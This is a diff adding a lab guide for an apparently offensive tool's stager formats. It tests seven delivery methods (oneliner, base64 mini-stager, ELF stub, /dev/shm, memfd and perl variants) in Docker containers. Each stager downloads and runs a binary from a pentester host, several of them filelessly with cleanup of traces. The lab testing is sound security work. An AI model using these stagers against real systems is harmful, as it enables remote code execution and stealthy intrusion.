@@ -1,0 +1,175 @@
+Lab: Stager Formats (all 7 delivery methods + --run-args)
+==========================================================
+
+Topology:
+  sf-pentester     10.30.0.2   Odyssey installed, generates payloads + runs stager-server
+  sf-target-full   10.30.0.3   bash + perl (tests all formats)
+  sf-target-minimal 10.30.0.4  busybox ash only (tests stub/oneliner without args)
+  sf-target-shm   10.30.0.5   bash + perl + exec-enabled /dev/shm (tests stub-shm)
+
+Setup:
+  cd docker/lab-stager-formats
+  docker compose up -d --build
+
+Verify:
+  docker logs sf-pentester            # "[pentester] ready"
+  docker exec sf-pentester odyssey stager --format list
+
+=============================================================================
+Test 1: oneliner + --run-args (linux, disk, ~85 chars)
+=============================================================================
+
+  # Terminal 1 - pentester: start stager-server (no-auth, serves odyssey binary)
+  docker exec -it sf-pentester bash
+  odyssey stager-server --listen 0.0.0.0:4444 --binary /usr/local/bin/odyssey --no-auth --verbose
+
+  # Terminal 2 - pentester: generate oneliner with --run-args
+  docker exec sf-pentester odyssey stager --connect 10.30.0.2:4444 --os linux --format oneliner --run-args "--version"
+
+  # Terminal 3 - target: paste the oneliner
+  docker exec -it sf-target-full bash
+  # paste output from terminal 2
+
+  Expected: Odyssey downloads, prints version string, exits
+
+=============================================================================
+Test 2: base64 mini-stager + --run-args (linux, disk, ~13 lines, token auth)
+=============================================================================
+
+  Two ways to pass args to the base64 format:
+    a) server-side: stager-server --args "..."  (server sends args via protocol)
+    b) generate-side: stager --run-args "..."   (args appended to execution line,
+       mini-stager forwards them to execve; takes priority over server --args)
+
+  # Terminal 1 - pentester: stager-server with token (no --args this time)
+  docker exec -it sf-pentester bash
+  odyssey stager-server --listen 0.0.0.0:5555 --binary /usr/local/bin/odyssey --token "lab-token-2026-test" --verbose
+
+  # Terminal 2 - pentester: generate base64 mini-stager with --run-args
+  docker exec sf-pentester odyssey stager --connect 10.30.0.2:5555 --os linux --format base64 --token "lab-token-2026-test" --run-args "--version"
+
+  # Terminal 3 - target: paste the ~13 lines
+  docker exec -it sf-target-full bash
+  # paste all lines from terminal 2
+
+  Expected: mini-stager authenticates, downloads Odyssey, runs with --version via memfd
+  Verify fileless: readlink /proc/<pid>/exe -> /memfd:... (if still running)
+
+=============================================================================
+Test 3: stub + --run-args (linux, disk /tmp, 1 line)
+=============================================================================
+
+  The 887-byte ELF stub carries a PATCH_ARGS buffer. With --run-args the
+  generator patches args directly into the shellcode (no bash needed).
+
+  # Terminal 1 - pentester: stager-server NO-AUTH
+  docker exec -it sf-pentester bash
+  odyssey stager-server --listen 0.0.0.0:4444 --binary /usr/local/bin/odyssey --no-auth --verbose
+
+  # Terminal 2 - pentester: generate stub with args
+  docker exec sf-pentester odyssey stager --connect 10.30.0.2:4444 --os linux --format stub --run-args "--version"
+
+  # Terminal 3 - target: paste 1 line
+  docker exec -it sf-target-full bash
+  # paste output
+
+  Expected: downloads Odyssey to /tmp/.s, runs with --version, cleans up
+  Verify: ls -la /tmp/.s should show "No such file" after execution
+
+=============================================================================
+Test 4: stub-shm + --run-args (linux, RAM /dev/shm, 1 line)
+=============================================================================
+
+  Uses sf-target-shm (has exec-enabled /dev/shm)
+
+  # Terminal 1 - pentester: stager-server no-auth
+  docker exec -it sf-pentester bash
+  odyssey stager-server --listen 0.0.0.0:4444 --binary /usr/local/bin/odyssey --no-auth --verbose
+
+  # Terminal 2 - generate with args
+  docker exec sf-pentester odyssey stager --connect 10.30.0.2:4444 --os linux --format stub-shm --run-args "--version"
+
+  # Terminal 3 - target-shm: paste 1 line
+  docker exec -it sf-target-shm bash
+  # paste output
+
+  Expected: downloads to /dev/shm/.s (RAM), runs with --version, cleans up
+  Note: /dev/shm is noexec in most Docker + hardened Linux. This target has exec enabled.
+
+=============================================================================
+Test 5: stub-memfd + --run-args (linux, 100% fileless, 1 line, needs perl)
+=============================================================================
+
+  The stub-memfd wraps the 887-byte ELF in a perl memfd loader. With --run-args
+  the args are patched into the shellcode before encoding.
+
+  # Terminal 1 - pentester: stager-server no-auth
+  docker exec -it sf-pentester bash
+  odyssey stager-server --listen 0.0.0.0:4444 --binary /usr/local/bin/odyssey --no-auth --verbose
+
+  # Terminal 2 - generate with args
+  docker exec sf-pentester odyssey stager --connect 10.30.0.2:4444 --os linux --format stub-memfd --run-args "--version"
+
+  # Terminal 3 - target-full: paste 1 line
+  docker exec -it sf-target-full bash
+  # paste output
+
+  Expected: perl downloads Odyssey, loads via memfd, runs with --version
+  Verify: nothing in /tmp or /dev/shm
+
+=============================================================================
+Test 6: perl-memfd + --run-args (linux, 100% fileless, 1 line, ~200 chars)
+=============================================================================
+
+  Shortest fileless format. No compiled stub, pure perl.
+
+  # Terminal 1 - pentester: stager-server no-auth
+  docker exec -it sf-pentester bash
+  odyssey stager-server --listen 0.0.0.0:4444 --binary /usr/local/bin/odyssey --no-auth --verbose
+
+  # Terminal 2 - generate with args
+  docker exec sf-pentester odyssey stager --connect 10.30.0.2:4444 --os linux --format perl-memfd --run-args "--version"
+
+  # Terminal 3 - target-full: paste 1 line
+  docker exec -it sf-target-full bash
+  # paste output
+
+  Expected: perl connects, downloads Odyssey, executes via memfd with --version
+
+=============================================================================
+Test 7: stub without args on minimal target (busybox ash, no bash, no perl)
+=============================================================================
+
+  Validates the compiled 887-byte ELF stub on a system with only base64 + sh.
+  Without --run-args, so the shellcode path is used (no bash needed).
+  The downloaded Odyssey will print its usage since no args are passed.
+
+  # Terminal 1 - pentester: stager-server no-auth
+  docker exec -it sf-pentester bash
+  odyssey stager-server --listen 0.0.0.0:4444 --binary /usr/local/bin/odyssey --no-auth --verbose
+
+  # Terminal 2 - generate stub format (NO --run-args)
+  docker exec sf-pentester odyssey stager --connect 10.30.0.2:4444 --os linux --format stub
+
+  # Terminal 3 - target-minimal (ash):
+  docker exec -it sf-target-minimal sh
+  # paste the line (busybox ash supports echo -n and base64 -d)
+
+  Expected: stub decodes, connects, downloads Odyssey, executes via memfd
+  Note: prints usage (no args). This test validates the shellcode path on minimal systems.
+
+=============================================================================
+
+Teardown:
+  docker compose down
+
+Summary table:
+  odyssey stager --format list
+
+--run-args behavior by format:
+  oneliner:    args appended to the bash/powershell command
+  base64:      args appended to the execution line (mini-stager forwards to execve)
+  stub:        args patched into shellcode PATCH_ARGS buffer (no extra deps)
+  stub-shm:    args patched into shellcode PATCH_ARGS buffer (no extra deps)
+  stub-memfd:  args patched into shellcode PATCH_ARGS buffer (no extra deps)
+  perl-memfd:  args added to perl exec call
